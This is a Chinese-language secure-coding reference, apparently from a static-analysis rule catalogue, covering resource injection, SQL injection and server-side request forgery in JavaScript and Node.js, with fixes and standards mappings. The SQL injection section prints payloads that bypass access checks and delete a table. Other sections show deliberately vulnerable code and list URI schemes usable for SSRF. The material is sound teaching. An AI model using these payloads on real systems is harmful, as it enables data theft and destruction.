<p>攻击者可以通过篡改环境间接地控制程序加载的库。我们不应当完全信赖环境，还需采取预防措施，防止攻击者利用某些控制环境的手段进行攻击。应尽可能由应用程序来控制各个库名称，并使用绝对路径来进行加载。如果编译时不清楚具体的路径，应该在执行的过程中利用可信赖的数值构造一个绝对路径。应对照一系列定义有效参数的不变量对从环境中读取的库名称和路径进行仔细的检查。</p>
<p>针对 Express 应用程序中 Response.render() 的情况，由于获取用于呈现的模板文件首先应全部具有静态扩展，因此对于已通过硬编码路径手动导入的库，仅应使用硬编码扩展。所以，无需使用此“功能”。 </p>
<p>有时还可以执行其他校验，以检查环境是否已被恶意篡改。例如，如果一个配置文件为可写，程序可能会拒绝运行。如果事先已知有关要加载的库的信息，程序就会执行检测，以校验文件的有效性。如果一个库应始终归属于某一特定用户，或者被分配了一组特定的权限，则可以在加载库之前，对这些属性进行校验。</p>
<p>最终，程序也许无法完全防范神通广大的攻击者控制其所加载的库。因此，对输入值和环境可能执行的任何操作，都应努力鉴别并加以防范。这样做是为了尽可能地防范各种攻击。</p>
<h5 id="REFERENCES-39"><a href="#REFERENCES-39" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Node.js Modules Documentation Node.js</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 114, CWE ID 494 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001764, CCI-001774, CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[8] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[10] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.14.2 Configuration Architectural Requirements, 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 10.2.3 Malicious Code Search, 10.3.2 Deployed Application Integrity Controls, 12.3.3 File Execution Requirements, 14.2.3 Dependency </p>
<p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[13] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[16] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[24] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20),Improper Filesystem Permissions (WASC-17) </p>
<h4 id="Resource-Injection"><a href="#Resource-Injection" class="headerlink" title="Resource Injection"></a>Resource Injection</h4><h5 id="ABSTRACT-40"><a href="#ABSTRACT-40" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用用户输入控制资源标识符，借此攻击者可以访问或修改其他受保护的系统资源。</p>
<h5 id="EXPLANATION-40"><a href="#EXPLANATION-40" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下两个条件时，就会发生 resource injection：</p>
<ol>
<li>攻击者可以指定已使用的标识符来访问系统资源。</li>
</ol>
<p>例如，攻击者可能可以指定用来连接到网络资源的端口号。</p>
<ol>
<li>攻击者可以通过指定特定资源来获取某种权限，而这种权限在一般情况下是不可能获得的。</li>
</ol>
<p>例如，程序可能会允许攻击者把敏感信息传输到第三方服务器。</p>
<p>注意：如果资源注入涉及存储在文件系统中的资源，则可以将其报告为名为路径篡改的不同类别。有关这一漏洞的详细信息，请参见 path manipulation 的描述。</p>
<p>示例：下面的代码使用读取自 HTTP 请求的 URL 来建立一个套接字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var socket = new WebSocket(document.URL.indexOf(&quot;url=&quot;)+20);</span><br></pre></td></tr></table></figure>
<p>这种受用户输入影响的资源表明其中的内容可能存在危险。例如，包含如句点、斜杠和反斜杠等特殊字符的数据在与 file system 相作用的方法中使用时，具有很大风险。类似的，对于创建远程结点的函数来说，包含 URL 和 URI 的数据也具有很大风险。</p>
<h5 id="RECOMMENDATIONS-40"><a href="#RECOMMENDATIONS-40" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>阻止 resource injection 的最佳做法是采用一些间接手段。例如创建一份合法资源名的列表，并且规定用户只能选择其中的文件名。通过这种方法，用户就不能直接由自己来指定资源的名称了。</p>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大，维护难度过大。因此，在这种情况下，程序员通常会采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<h5 id="REFERENCES-40"><a href="#REFERENCES-40" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 99 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[7] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A5 Broken Access Control </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection, Control Objective 5.4 - Authentication and Access Control </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><h5 id="ABSTRACT-41"><a href="#ABSTRACT-41" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过不可信赖的数据源输入构建动态 SQL 语句，攻击者就能够修改语句的含义或者执行任意 SQL 命令。</p>
<h5 id="EXPLANATION-41"><a href="#EXPLANATION-41" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL injection 错误在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造一个 SQL 查询。</p>
</li>
</ol>
<p>例 1：以下代码动态地构造并执行了一个 SQL 查询，该查询可以搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。</p>
<pre><code>...

var username = document.form.username.value;

var itemName = document.form.itemName.value;

var query = &quot;SELECT * FROM items WHERE owner = &quot; + username + &quot; AND itemname = &quot; + itemName + &quot;;&quot;;

db.transaction(function (tx) {

    tx.executeSql(query);

    }

)

...
</code></pre><p>查询计划执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &lt;userName&gt;</span><br><span class="line"></span><br><span class="line">AND itemname = &lt;itemName&gt;;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在itemName不包含单引号字符时，才会正确执行这一查询。如果一个用户名为wiley的攻击者为itemName输入字符串“name’ OR ‘a’=’a”，那么查询就会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos; OR &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>附加条件OR ‘a’=’a’会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items;</span><br></pre></td></tr></table></figure>
<p>通常，查询必须仅返回已通过身份验证的用户所拥有的条目，而通过以这种方式简化查询，攻击者就可以规避这一要求。现在，查询会返回存储在items表中的所有条目，而不论其指定所有者是谁。</p>
<p>示例 2：此示例说明了将不同的恶意值传递给Example 1.中构造和执行的查询所带来的影响。如果一个用户名为wiley的攻击者为itemName输入字符串“name’; DELETE FROM items; –”，则该查询就会变为以下两个查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line">--&apos;</span><br></pre></td></tr></table></figure>
<p>众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。</p>
<p>注意末尾的一对连字符 (–)；这在大多数数据库服务器上都表示该语句剩余部分将视为注释，不会加以执行 [4]。在这种情况下，可通过注释字符删除修改后的查询遗留的末尾单引号。而在不允许通过这种方式使用注释的数据库上，攻击者通常仍可使用类似于Example 1.中所用的技巧进行攻击。如果攻击者输入字符串“name’); DELETE FROM items; SELECT * FROM items WHERE ‘a’=’a”，将创建以下三个有效语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line">SELECT * FROM items WHERE &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：</p>
<ul>
<li><p>把没有被黑名单引用的值作为目标</p>
</li>
<li><p>寻找方法以绕过某些需要转义的元字符</p>
</li>
<li><p>使用存储过程隐藏注入的元字符</p>
</li>
</ul>
<p>手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。</p>
<p>防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。所以再次强调，存储过程在某些情况下可以避免这种攻击，但是并不能完全保护您的应用系统抵御 SQL injection 的攻击。</p>
<h5 id="RECOMMENDATIONS-41"><a href="#RECOMMENDATIONS-41" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。</p>
<p>在 HTML5 中，前面的例子可以改成使用参数化 SQL 指令（而不是连接用户提供的字符串），如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var username = document.form.username.value;</span><br><span class="line"></span><br><span class="line">var itemName = document.form.itemName.value;</span><br><span class="line"></span><br><span class="line">var query = &quot;SELECT * FROM items WHERE owner = ? AND itemname = ? ;&quot;;</span><br><span class="line"></span><br><span class="line">db.transaction(function (tx) &#123;</span><br><span class="line"></span><br><span class="line">	tx.executeSql(query,[username,itemName]);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在WHERE条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个 SQL 指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<h5 id="REFERENCES-41"><a href="#REFERENCES-41" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] S. J. Friedl SQL Injection Attacks by Example </p>
<p>[2] P. Litwin Stop SQL Injection Attacks Before They Stop You MSDN Magazine</p>
<p>[3] P. Finnigan SQL Injection and Oracle, Part One Security Focus</p>
<p>[4] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 89 </p>
<p>[6] Standards Mapping - Common Weakness Enumeration Top 25 2019 [6] CWE ID 089 </p>
<p>[7] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[8] Standards Mapping - FIPS200 SI </p>
<p>[9] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[10] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[11] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[13] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.4 Output Encoding and Injection Prevention Requirements, 5.3.5 Output Encoding and Injection Prevention Requirements </p>
<p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[15] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[16] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[17] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[18] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[19] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[25] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[26] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[27] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[28] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089 </p>
<p>[29] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089 </p>
<p>[30] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089 </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[45] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[46] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[47] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[48] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection </p>
<p>[49] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19) </p>
<h4 id="Server-Side-Request-Forgery"><a href="#Server-Side-Request-Forgery" class="headerlink" title="Server-Side Request Forgery"></a>Server-Side Request Forgery</h4><h5 id="ABSTRACT-42"><a href="#ABSTRACT-42" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序将使用用户控制的数据启动与第三方系统的连接，以创建资源 URI。</p>
<h5 id="EXPLANATION-42"><a href="#EXPLANATION-42" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者可以影响应用程序服务器建立的网络连接时，将会发生 Server-Side Request Forgery。网络连接源自于应用程序服务器内部 IP 地址，因此攻击者将可以使用此连接来避开网络控制，并扫描或攻击没有以其他方式暴露的内部资源。</p>
<p>示例：在下列示例中，攻击者将能够控制服务器连接至的 URL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var request_url = url.parse(request.url, true)[&apos;query&apos;][&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">  http.request(request_url)</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>攻击者能否劫持网络连接取决于他可以控制的 URI 的特定部分以及用于建立连接的库。例如，控制 URI 方案将使攻击者可以使用不同于 http 或 https 的协议，类似于下面这样：</p>
<ul>
<li><p>up://</p>
</li>
<li><p>ldap://</p>
</li>
<li><p>jar://</p>
</li>
<li><p>gopher://</p>
</li>
<li><p>mailto://</p>
</li>
<li><p>ssh2://</p>
</li>
<li><p>telnet://</p>
</li>
<li><p>expect://</p>
</li>
</ul>
<p>攻击者将可以利用劫持的此网络连接执行下列攻击：</p>
<ul>
<li><p>对内联网资源进行端口扫描。</p>
</li>
<li><p>避开防火墙。</p>
</li>
<li><p>攻击运行于应用程序服务器或内联网上易受攻击的程序。</p>
</li>
<li><p>使用 Injection 攻击或 CSRF 攻击内部/外部 Web 应用程序。</p>
</li>
<li><p>使用 file:// 方案访问本地文件。</p>
</li>
<li><p>在 Windows 系统上，file:// 方案和 UNC 路径可以允许攻击者扫描和访问内部共享。</p>
</li>
<li><p>执行 DNS 缓存中毒攻击。</p>
</li>
</ul>
<h5 id="RECOMMENDATIONS-42"><a href="#RECOMMENDATIONS-42" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿基于用户控制的数据建立网络连接，并要确保请求发送给预期的目的地。如果需要提供用户数据来构建目的地 URI，请采用间接方法：例如创建一个合法资源名的列表，用户只能选择其中的内容。通过这种方法，就不能直接使用用户提供的输入来指定资源名称。</p>
